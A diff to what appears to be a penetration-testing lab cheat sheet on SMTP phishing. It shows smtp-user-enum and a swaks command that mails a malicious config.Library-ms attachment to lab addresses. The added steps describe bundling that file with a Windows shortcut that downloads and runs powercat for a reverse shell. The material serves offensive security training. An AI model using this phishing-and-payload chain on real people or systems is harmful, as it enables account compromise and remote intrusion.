@@ -919,8 +919,11 @@ smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode, it can be RCPT, 
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 ### SMTP - swaks Phishing mail
-- Open Windows prep machine -> Open the VisualStudio Code -> open new file name it as config.Library-ms
-- Transfer using ssh below commands
+- Open the VisualStudio code open new text file paste below code (Enter KALI IP) save it.
+- Double click to open the file(config file, created in above) include same config file.
+- Include powershell shortcut(On Desktop RightClick -> New -> Shortcut -> (in open location place Include below powershell powercat download execute command), save it powershell). # Putcorrect IP address
+- Now this folder has config file and powershell shortcut.
+- Transfer this file to kali using ssh command below. 
 ```powershell
 ## config.Library-ms file start -----------------------
 <?xml version="1.0" encoding="UTF-8"?>
